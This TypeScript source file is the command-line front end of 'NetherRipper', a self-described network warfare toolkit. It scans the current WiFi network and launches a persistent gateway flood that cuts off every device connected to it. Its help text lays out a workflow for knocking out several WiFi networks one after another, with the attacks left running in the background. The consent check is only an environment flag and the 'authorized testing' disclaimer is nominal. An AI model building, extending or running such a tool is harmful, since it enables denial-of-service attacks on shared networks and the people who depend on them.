import chalk from 'chalk';
import { 
  getActiveInterface, 
  getNetworkInfo, 
  scanNetwork
} from './core/scanner';
import {
  startPersistentFlood,
  stopAllPersistentAttacks,
  listPersistentAttacks,
  formatPersistentAttacks,
  hasActiveAttacks,
  getCurrentSSID
} from './core/persistent';
import { 
  requireRoot, 
  checkDependencies
} from './core/exec';
import { checkFloodTools } from './core/flood';

/**
 * Show epic banner
 */
function showBanner(): void {
  console.clear();
  
    console.log(chalk.magenta.bold(`
███╗   ██╗███████╗████████╗██╗  ██╗███████╗██████╗ 
████╗  ██║██╔════╝╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██╔██╗ ██║█████╗     ██║   ███████║█████╗  ██████╔╝
██║╚██╗██║██╔══╝     ██║   ██╔══██║██╔══╝  ██╔══██╗
██║ ╚████║███████╗   ██║   ██║  ██║███████╗██║  ██║
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
`));

  console.log(chalk.magenta.bold(`
██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
██║  ██║██║██║     ██║     ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
`));
  
  console.log(chalk.cyan.bold('         ⟪═══════════════════════════════════════⟫'));
  console.log(chalk.cyan.bold('            ⚡ NETWORK WARFARE TOOLKIT v1.0 ⚡'));
  console.log(chalk.cyan.bold('         ⟪═══════════════════════════════════════⟫\n'));
  
  console.log(chalk.red('     ╔═══════════════════════════════════════════════════╗'));
  console.log(chalk.red('     ║') + chalk.yellow.bold(' ▶ SYSTEM ARMED - WEAPONS HOT                     ') + chalk.red('║'));
  console.log(chalk.red('     ║') + chalk.white('   └─ Gateway Saturation Attack ............. [ON]  ') + chalk.red('║'));
  console.log(chalk.red('     ║') + chalk.white('   └─ Multi-WiFi Targeting ................... [ON]  ') + chalk.red('║'));
  console.log(chalk.red('     ║') + chalk.white('   └─ Persistent Background Mode ............. [ON]  ') + chalk.red('║'));
  console.log(chalk.red('     ╠═══════════════════════════════════════════════════╣'));
  console.log(chalk.red('     ║') + chalk.red.bold(' ⚠️  DANGER: EXTREME OFFENSIVE CAPABILITY          ') + chalk.red('║'));
  console.log(chalk.red('     ║') + chalk.yellow('     » Authorized Testing ONLY                     ') + chalk.red('║'));
  console.log(chalk.red('     ║') + chalk.yellow('     » Educational Purpose                         ') + chalk.red('║'));
  console.log(chalk.red('     ║') + chalk.yellow('     » Illegal Use = Prosecution                   ') + chalk.red('║'));
  console.log(chalk.red('     ╚═══════════════════════════════════════════════════╝\n'));
  
  console.log(chalk.gray('     [ Developed by Elite Security Research Division ]'));
  console.log(chalk.gray('     [ Framework: TypeScript + Bun | License: MIT ]\n'));
}

/**
 * Show help
 */
function showHelp(): void {
  console.log(chalk.cyan.bold('NetherRipper - Network Attack Tool\n'));
  console.log(chalk.white('Usage:'));
  console.log(chalk.gray('  sudo nr <command>\n'));
  console.log(chalk.white('Commands:'));
  console.log(chalk.green('  scan             ') + chalk.gray('Scan current WiFi network'));
  console.log(chalk.red('  kill             ') + chalk.gray('💀 KILL current WiFi (all devices affected!)'));
  console.log(chalk.green('  stop             ') + chalk.gray('Stop all attacks and restore networks'));
  console.log(chalk.green('  status           ') + chalk.gray('Show active attacks'));
  console.log(chalk.green('  help             ') + chalk.gray('Show this help\n'));
  console.log(chalk.white('Workflow:'));
  console.log(chalk.gray('  1. Connect to WiFi A'));
  console.log(chalk.red('  2. sudo nr kill              ') + chalk.gray('← Attack WiFi A'));
  console.log(chalk.gray('  3. Connect to WiFi B'));
  console.log(chalk.red('  4. sudo nr kill              ') + chalk.gray('← Attack WiFi B (A still dead!)'));
  console.log(chalk.gray('  5. Connect to WiFi C'));
  console.log(chalk.red('  6. sudo nr kill              ') + chalk.gray('← Attack WiFi C (A,B still dead!)'));
  console.log(chalk.green('  7. sudo nr stop              ') + chalk.gray('← Restore ALL WiFi networks\n'));
  console.log(chalk.yellow('Tips:'));
  console.log(chalk.gray('  • Set intensity: export NETHER_FLOOD_INTENSITY=extreme'));
  console.log(chalk.gray('  • Attacks persist even after disconnect'));
  console.log(chalk.gray('  • All devices on WiFi will be affected\n'));
}

/**
 * Check consent
 */
function checkConsent(): void {
  if (process.env.NETHER_CONSENT !== 'yes') {
    console.log(chalk.red('❌ Ethical consent required'));
    console.log(chalk.yellow('\nSet environment variable:'));
    console.log(chalk.white('  export NETHER_CONSENT=yes\n'));
    process.exit(1);
  }
}

/**
 * Command: scan
 */
async function cmdScan(): Promise<void> {
  console.log(chalk.cyan('🔍 Scanning current WiFi network...\n'));

  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);
  const ssid = await getCurrentSSID(iface);

  console.log(chalk.white('Network Information:'));
  console.log(chalk.gray(`  SSID: ${ssid}`));
  console.log(chalk.gray(`  Interface: ${iface}`));
  console.log(chalk.gray(`  Your IP: ${networkInfo.ip}`));
  console.log(chalk.gray(`  Gateway: ${networkInfo.gateway}`));
  console.log(chalk.gray(`  Network: ${networkInfo.networkAddress}/${networkInfo.subnet}\n`));

  // Scan network
  const devices = await scanNetwork(networkInfo);

  if (devices.length === 0) {
    console.log(chalk.yellow('No devices found'));
    return;
  }

  // Display results
  console.log(chalk.cyan(`Devices on ${ssid}:\n`));
  console.log(chalk.white('┌─────────────────┬───────────────────┬──────────────────────┐'));
  console.log(chalk.white('│ IP Address      │ MAC Address       │ Info                 │'));
  console.log(chalk.white('├─────────────────┼───────────────────┼──────────────────────┤'));

  for (const device of devices) {
    const ip = device.ip.padEnd(15);
    const mac = device.mac.padEnd(17);
    let info = device.vendor || 'Unknown';
    
    if (device.isGateway) {
      info = chalk.blue('[Gateway]');
    } else if (device.isOwn) {
      info = chalk.green('[You]');
    }

    console.log(`│ ${ip} │ ${mac} │ ${info.padEnd(20)} │`);
  }

  console.log(chalk.white('└─────────────────┴───────────────────┴──────────────────────┘\n'));
  console.log(chalk.green(`✓ Found ${devices.length} devices on this network\n`));
  
  console.log(chalk.yellow('💡 Next step:'));
  console.log(chalk.white('   Run ') + chalk.red.bold('sudo nr kill') + chalk.white(' to attack this WiFi\n'));
}

/**
 * Command: kill (Gateway Flood Attack)
 */
async function cmdKill(): Promise<void> {
  console.log(chalk.red.bold('\n╔═══════════════════════════════════════════════════╗'));
  console.log(chalk.red.bold('║  💀 GATEWAY SATURATION - NETWORK KILLER  💀      ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╠═══════════════════════════════════════════════════╣'));
  console.log(chalk.red.bold('║  This will DESTROY the entire WiFi network!       ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  ALL devices will lose connection!                ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                   ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Attack runs in BACKGROUND - persists forever!    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║                                                   ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('║  Press Ctrl+C to abort (5s)...                    ') + chalk.red.bold('║'));
  console.log(chalk.red.bold('╚═══════════════════════════════════════════════════╝\n'));

  // Wait 5 seconds
  await new Promise(resolve => setTimeout(resolve, 5000));

  // Get network info
  const iface = await getActiveInterface();
  const networkInfo = await getNetworkInfo(iface);
  const gatewayIp = networkInfo.gateway;
  const ssid = await getCurrentSSID(iface);

  console.log(chalk.cyan(`🎯 Target Information:`));
  console.log(chalk.white(`  WiFi: `) + chalk.yellow.bold(ssid));
  console.log(chalk.white(`  Gateway: `) + chalk.red.bold(gatewayIp));
  console.log(chalk.white(`  Interface: `) + chalk.gray(iface));
  console.log('');

  // Check flood tools
  const tools = await checkFloodTools();
  if (!tools.hping3) {
    console.log(chalk.yellow('⚠️  Warning: hping3 not installed (reduced effectiveness)'));
    console.log(chalk.gray('   Install with: sudo apt install hping3\n'));
  }

  // Choose intensity
  const intensity = process.env.NETHER_FLOOD_INTENSITY || 'high';
  console.log(chalk.red(`🌊 Deploying attack at `) + chalk.red.bold(`${intensity.toUpperCase()}`) + chalk.red(` intensity...\n`));

  // Start PERSISTENT flood
  try {
    const attackId = await startPersistentFlood(gatewayIp, iface, intensity);

    console.log(chalk.red.bold('\n💀 NETWORK KILLER DEPLOYED!\n'));
    console.log(chalk.green(`✓ Attack ID: `) + chalk.white(attackId));
    console.log(chalk.green(`✓ Target: `) + chalk.white(`${gatewayIp} (${ssid})`));
    console.log(chalk.green(`✓ Status: `) + chalk.red.bold(`ACTIVE - RUNNING IN BACKGROUND\n`));
    
    console.log(chalk.yellow('🔥 Effects:'));
    console.log(chalk.gray('   • All devices on this WiFi will experience:'));
    console.log(chalk.red('     - 99% packet loss'));
    console.log(chalk.red('     - 3000ms+ latency'));
    console.log(chalk.red('     - Connection timeouts'));
    console.log(chalk.red('     - Unable to browse/stream/game\n'));
    
    console.log(chalk.cyan('💡 Attack persists even if you:'));
    console.log(chalk.gray('   • Disconnect from this WiFi'));
    console.log(chalk.gray('   • Connect to another WiFi'));
    console.log(chalk.gray('   • Close this terminal\n'));
    
    console.log(chalk.yellow('🎯 To attack multiple WiFi networks:'));
    console.log(chalk.gray('   1. Leave this attack running (it persists!)'));
    console.log(chalk.gray('   2. Connect to another WiFi'));
    console.log(chalk.gray('   3. Run ') + chalk.red.bold('sudo nr kill') + chalk.gray(' again'));
    console.log(chalk.gray('   4. Repeat for more networks\n'));
    
    console.log(chalk.red('⚠️  To stop ALL attacks:'));
    console.log(chalk.white('   ') + chalk.green.bold('sudo nr stop\n'));

    // Show current attacks
    if (listPersistentAttacks().length > 1) {
      console.log(chalk.cyan('📊 Currently Active Attacks:\n'));
      console.log(formatPersistentAttacks());
    }

  } catch (error) {
    if (error instanceof Error && error.message.includes('already under attack')) {
      console.error(chalk.yellow(`\n⚠️  This WiFi is already under attack!`));
      console.error(chalk.gray('   Run ') + chalk.green.bold('sudo nr status') + chalk.gray(' to see active attacks\n'));
    } else {
      console.error(chalk.red(`\n❌ Failed to deploy attack: ${error}\n`));
    }
    process.exit(1);
  }
}

/**
 * Command: stop
 */
async function cmdStop(): Promise<void> {
  console.log(chalk.cyan('\n🛑 Stopping all attacks...\n'));

  if (!hasActiveAttacks()) {
    console.log(chalk.yellow('No active attacks to stop\n'));
    return;
  }

  const attacks = listPersistentAttacks();
  console.log(chalk.yellow(`Found ${attacks.length} active attack(s):\n`));
  
  for (const attack of attacks) {
    console.log(chalk.gray(`  • ${attack.ssid} (${attack.gatewayIp})`));
  }
  
  console.log('');
  
  await stopAllPersistentAttacks();
  
  console.log(chalk.green.bold(`\n✨ ALL ATTACKS STOPPED (${attacks.length} networks restored)`));
  console.log(chalk.green('✓ All WiFi networks back to normal\n'));
}

/**
 * Command: status
 */
async function cmdStatus(): Promise<void> {
  console.log(chalk.cyan('\n📊 NetherRipper Status\n'));
  
  if (!hasActiveAttacks()) {
    console.log(chalk.gray('No active attacks\n'));
    console.log(chalk.yellow('💡 Tip: Run ') + chalk.red.bold('sudo nr kill') + chalk.yellow(' to start an attack\n'));
    return;
  }

  console.log(chalk.red.bold('💀 ACTIVE NETWORK ATTACKS:\n'));
  console.log(formatPersistentAttacks());
  console.log(chalk.red('⚠️  Use ') + chalk.green.bold('sudo nr stop') + chalk.red(' to stop all attacks\n'));
}

/**
 * Main CLI
 */
async function main(): Promise<void> {
  const args = process.argv.slice(2);
  const command = args[0] || 'help';

  // Show help without checks
  if (command === 'help' || command === '--help' || command === '-h') {
    showHelp();
    return;
  }

  // Show banner
  showBanner();

  // Check consent
  checkConsent();

  // Check root for dangerous commands
  if (['kill', 'stop', 'scan'].includes(command)) {
    requireRoot();
  }

  // Check dependencies
  const missing = await checkDependencies();
  if (missing.length > 0) {
    console.log(chalk.red('❌ Missing required tools:'));
    for (const tool of missing) {
      console.log(chalk.gray(`   - ${tool}`));
    }
    console.log(chalk.yellow('\nInstall with: sudo apt install iproute2 iptables net-tools iputils-arping hping3\n'));
    process.exit(1);
  }

  // Route commands
  try {
    switch (command) {
      case 'scan':
        await cmdScan();
        break;

      case 'kill':
        await cmdKill();
        break;

      case 'stop':
        await cmdStop();
        break;

      case 'status':
        await cmdStatus();
        break;

      default:
        console.log(chalk.red(`❌ Unknown command: ${command}`));
        console.log(chalk.gray('   Run ') + chalk.white.bold('nr help') + chalk.gray(' for usage\n'));
        process.exit(1);
    }
  } catch (error) {
    console.error(chalk.red('\n❌ Error:'), error instanceof Error ? error.message : error);
    console.error(chalk.gray('\nTry running with ') + chalk.white.bold('sudo -E') + chalk.gray(' to preserve environment variables\n'));
    process.exit(1);
  }
}

// Handle Ctrl+C
process.on('SIGINT', async () => {
  console.log(chalk.yellow('\n\n⚠️  Interrupted by user'));
  console.log(chalk.white('   Attacks are still running in background'));
  console.log(chalk.white('   Run ') + chalk.green.bold('sudo nr stop') + chalk.white(' to cleanup\n'));
  process.exit(130);
});

// Run
main().catch(error => {
  console.error(chalk.red('Fatal error:'), error);
  process.exit(1);
});